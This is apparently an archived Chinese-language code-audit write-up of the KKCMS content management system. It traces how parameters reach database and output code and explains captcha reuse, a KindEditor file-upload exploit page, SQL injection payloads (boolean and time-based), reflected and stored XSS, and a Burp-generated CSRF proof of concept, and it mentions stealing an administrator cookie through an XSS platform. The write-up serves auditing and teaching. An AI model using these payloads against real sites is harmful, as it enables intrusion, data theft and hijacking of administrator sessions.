---
title: "Auditing KKCMS: Following Input to Security-Sensitive Operations"
title_zh: "KKCMS 代码审计：沿参数追踪漏洞"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: Code Audit of KKCMS
date: 2020-07-07 18:48:00
slug: Code-Audit-KKCMS
permalink: writing/Code-Audit-KKCMS/
topic: Code auditing
summary: "Tracing parameters through uploads, login and administrative forms to explain SQL injection, XSS and CSRF."
summary_zh: "沿验证码、上传、登录、分类页面和后台表单逐点跟踪参数，结合源码与请求观察解释SQL注入、XSS及CSRF的形成条件，记录从入口到危险操作的审计过程。"
format_label: Technical notes
featured_rank: 1
missing_images: 42
withheld_images: 0
recovered_images: 0
tags: Vulnerabilities
---

## 0x01 验证码重用

![历史配图暂缺](redacted-image:missing)

每次失败访问后，都会进行刷新跳转，然后重新执行一次JS代码

![历史配图暂缺](redacted-image:missing)

但是由于Burp默认不解析js，所以这里存在验证码复用的漏洞

抓包显示验证码是8868，连续发送两次包，发现验证码都是0348，没有变过

![历史配图暂缺](redacted-image:missing)

在控制器中我们看到了一个参数 verifycode，这个便是验证码，通过跟踪发现verifycode 还出现在 verifycode.php 中 $_SESSION['verifycode']  

![历史配图暂缺](redacted-image:missing)

验证码重用漏洞放到注册界面会造成用户批量注册

但放在这里危害不大

目前很多验证码重用漏洞都利用的是burp对js不解析的特性

## 0x02 非shell的上传漏洞

### 漏洞详情

![历史配图暂缺](redacted-image:missing)

从代码可以看出来允许上传html类型的文件

在后台寻找上传入口无果,

索性在Seay中跟踪一下发现,存在GET传参dir

![历史配图暂缺](redacted-image:missing)

查看kindeditor版本

![历史配图暂缺](redacted-image:missing)

确认存在可利用漏洞

漏洞存在<=kindeditor4.1.5版本编辑器

验证是否存在

```
kindeditor/asp/upload_json.asp?dir=file

kindeditor/asp.net/upload_json.ashx?dir=file

kindeditor/jsp/upload_json.jsp?dir=file

kindeditor/php/upload_json.php?dir=file

editor/asp/upload_json.asp?dir=file

editor/asp.net/upload_json.ashx?dir=file

editor/jsp/upload_json.jsp?dir=file

editor/php/upload_json.php?dir=file
```

### 通杀EXP

![历史配图暂缺](redacted-image:missing)

```html
<html>
<head>
    <title>Uploader</title>
    <script src="https://lab.example.com/kkcms/editor/kindeditor.js"></script>
    <script>
        KindEditor.ready(function(K) {
            var uploadbutton = K.uploadbutton({
                button: K('#uploadButton')[0],
                fieldName: 'imgFile',
                url: 'https://lab.example.com/kkcms/editor/php/upload_json.php?dir=evil',
                afterUpload: function(data) {
                    if (data.error === 0) {
                        var url = K.formatUrl(data.url, 'absolute');
                        K('#url').val(url);
                    }
                },
            });
            uploadbutton.fileBox.change(function(e) {
                uploadbutton.submit();
            });
        });
    </script>
</head>
<body>
    <div class="upload">
        <input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />
        <input type="button" id="uploadButton" value="Upload" />
    </div>
</body>
</html>
```

### 漏洞修复

1.直接删除upload_json和file_manager_json

2.升级kindeditor到最新版本

## 0x03 后台登录SQL注入

在/admin/cms_login.php中我们发现a_name和a_password没有做任何的过滤就被带入到数据库

![历史配图暂缺](redacted-image:missing)

但是通过注入测试发现,好像并没有这么简单

跟踪引用文件,发现在library.php中有这么一段

![历史配图暂缺](redacted-image:missing)

分析代码：

如果没有开启魔术引号,这个时候不论GET还是POST传参,都会加上addslashes,

因此在这里的双引号自然就会被加上反斜杠了

### addslashes

(PHP 4, PHP 5, PHP 7)

使用反斜线引用字符串

**addslashes** ( string `$str` ) : string

返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（*'*）、双引号（*"*）、反斜线（*\*）与  NUL（**`NULL`** 字符）。

一个使用 **addslashes()**  的例子是当你要往数据库中输入数据时。 例如，将名字 *O'reilly* 插入到数据库中，这就需要对其进行转义。 强烈建议使用 DBMS  指定的转义函数 （比如 MySQL 是 [mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)，PostgreSQL  是 [pg_escape_string()](https://www.php.net/manual/en/function.pg-escape-string.php)），但是如果你使用的  DBMS 没有一个转义函数，并且使用 *\* 来转义特殊字符，你可以使用这个函数。 仅仅是为了获取插入数据库的数据，额外的*\*  并不会插入。 当 PHP 指令 [magic_quotes_sybase](https://www.php.net/manual/en/sybase.configuration.php#ini.magic-quotes-sybase)  被设置成 *on* 时，意味着插入 *'* 时将使用 *'* 进行转义。

PHP 5.4 之前 PHP 指令 [magic_quotes_gpc](https://www.php.net/manual/en/info.configuration.php#ini.magic-quotes-gpc) 默认是  *on*， 实际上所有的 GET、POST 和 COOKIE 数据都用被 **addslashes()** 了。 不要对已经被 [magic_quotes_gpc](https://www.php.net/manual/en/info.configuration.php#ini.magic-quotes-gpc)  转义过的字符串使用 **addslashes()**，因为这样会导致双层转义。  遇到这种情况时可以使用函数 [get_magic_quotes_gpc()](https://www.php.net/manual/en/function.get-magic-quotes-gpc.php) 进行检测。

**参数**

- `str`

  要转义的字符。

**返回值**

返回转义后的字符。

**范例**

```php
<?php$str = "Is your name O'reilly?";
// 输出： Is your name O\'reilly?
echo addslashes($str);?>  
```

### 绕过

关于如何绕过,网上提供两种思路，一种是url编码绕过,另一种是base64编码绕过

具体的可以[参见](/writing/Common-SQL-Injection-Defenses-and-Bypasses/)

## 0x04 前端SQL注入1

查看vlist.php文件

![历史配图暂缺](redacted-image:missing)

可以看到$_GET['cid']并没有做任何传入参数过滤处理

用sqlmap可以直接跑出来

![历史配图暂缺](redacted-image:missing)

## 0x05 前台SQL注入2

查看**/ucenter/reg.php**,

![历史配图暂缺](redacted-image:missing)

分析发现

> trim去除空格
>
> stripslashes旨在删除由 addslashes()函数添加的反斜杠

前面提到引用的文件带有addslashes()函数用反斜杠转义过滤,但是这里使用stripslashes()函数,则抵消了addslashes()函数的作用效果

## 0x06 后台多处注入

**/admin/cms_ad_edit.php**

![历史配图暂缺](redacted-image:missing)

**/admin/cms_book_edit.php**

![历史配图暂缺](redacted-image:missing)

**/admin/cms_channel_edit.php**

![历史配图暂缺](redacted-image:missing)

**后台造成SQL注入的原因都一样，是接收的参数id没有使用单引号或双引号包含，导致addslashes()函数失效.**

**直接全局搜索$_GET['id']可以发现，后台很多地方其实也存在注入，只要包含$result，基本存在漏洞**

payload:

````HTTP
https://lab.example.com/kkcms/admin/cms_usergroup_edit.php?id=1%20and%20ascii(left(database(),1))=108--+
````

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

可以根据ASCII 对照表以此类推

## 0x07 后台删除SQL注入

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

可以看出来,传参del可能存在sql注入

跟进审计

![历史配图暂缺](redacted-image:missing)

发现几乎都未进行过滤参数,也未引用过滤文件，全局搜索$_GET['del'],几乎都存在注入

![历史配图暂缺](redacted-image:missing)

payload:

```http
http://lab.example.com/kkcms/admin/cms_usergroup.php?del=2%20and%20sleep(5)
```

![历史配图暂缺](redacted-image:missing)

## 0x08 前台多处反射型XSS

**/template/wapian/dongman.php**

**/template/wapian/movie.php**

**/template/wapian/dongman.php**

**/template/wapian/tv.php**

**/template/wapian/zongyi.php**

点击切换页数，会发现带有参数传递,F12查看元素

![历史配图暂缺](redacted-image:missing)

进入**/template/wapian/dongman.php**审计查找$_GET['m']参数的出现位置

![历史配图暂缺](redacted-image:missing)

同时也发现了m参数**就是echo出具体的数据类容**,同时这里的过滤不太严格

定位跟踪getPageHtml函数

![历史配图暂缺](redacted-image:missing)

这里并没有任何过滤

构造payload

```http
https://lab.example.com/kkcms/dongman.php?m=%22%3E%3Cscript%3Ealert(1111111)%3C/script%3E
?cat=all&page=2
```

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

全局搜索,含有此传参的,几乎都存在反射型XSS

![历史配图暂缺](redacted-image:missing)

## 0x09 CSRF与XSS

**/admin/cms_link.php**

**/admin/model/link.php**

### 漏洞复现

**首先来到后台友情链接这里**

简单的尝试,发现名称和地址都存在存储型XSS,直接输入

```js
<script>alert(111111111)</script>
```

方可插入

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

配合CSRF使用,抓包生成CSRF POC

![历史配图暂缺](redacted-image:missing)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://lab.example.com/kkcms/admin/cms_link.php" method="POST">
      <input type="hidden" name="l&#95;name" value="&lt;script&gt;alert&#40;111111111&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="l&#95;logo" value="" />
      <input type="hidden" name="l&#95;url" value="http&#58;&#47;&#47;" />
      <input type="hidden" name="l&#95;sort" value="0" />
      <input type="hidden" name="save" value="æ&#143;&#144;äº&#164;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

在本地新建文件EXP.html

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

![历史配图暂缺](redacted-image:missing)

即可回显添加成功

### 漏洞分析

跟踪**cms_link**.php代码

![历史配图暂缺](redacted-image:missing)

发现输出没有任何过滤

全局搜索l_name

![历史配图暂缺](redacted-image:missing)

在/model/kink.php中我们很明显的发现

![历史配图暂缺](redacted-image:missing)

参数被接收后没有做任何过滤直接插入数据库,**没有对传入的数据直接进行验证，所以产生了XSS漏洞**

### **CSRF原理**

**这里先假设友链=a页面，burp生成的csrf.html为b页面。A页面需要管理员登陆的情况下，黑客诱惑管理员点击b页面，这时候b页面有我们的恶意代码，可以借用a页面中的管理员去执行b页面中的恶意payload**

### **执行b页面原因**

**A页面管理员在已经登陆的情况下是会有个cookie的，如果你再打开一个后台页面是不需要登陆一遍的。CSRF就是借用管理员的cookie，去执行添加友链的表单，所以就打出CSRF了。**

### **核心代码**

**第一个isset 判断里面的数据是否已设置并且不为NULL**

**第二然后已POST类型进行传参**

**然后就是下面的$sql insert into 把数据传到数据库里面**

**$sql = 'insert into xtcms_link (' . $str[0] . ') values (' . $str[1] . ')';**

**然后下面就是判断，最后就是回显内容了。用BURP抓了个输入内容的数据包可以知道这边没有token, 而且也没有二次校验，导致了XSS，这也导致了即存在XSS也存在CSRF漏洞**

### 接收cookie

在留言板处插入配合XSS平台使用的代码

![历史配图暂缺](redacted-image:missing)

后台访问可直接在XSS平台弹出管理员cookie

![历史配图暂缺](redacted-image:missing)

分析book.php,不难发现传参只对单双引号做了反斜杠过滤,绕过只需不用到单双引号即可

![历史配图暂缺](redacted-image:missing)

## 0x10 总结

还有几个XSS在友链,都很简单就不复现了

KKCMS适合新手去审计

审计配合Seay工具很方便

在使用中要发现问题代码传参的地方

搭配全局搜索很好用

在插入数据库的测试中可以使用MySql监控
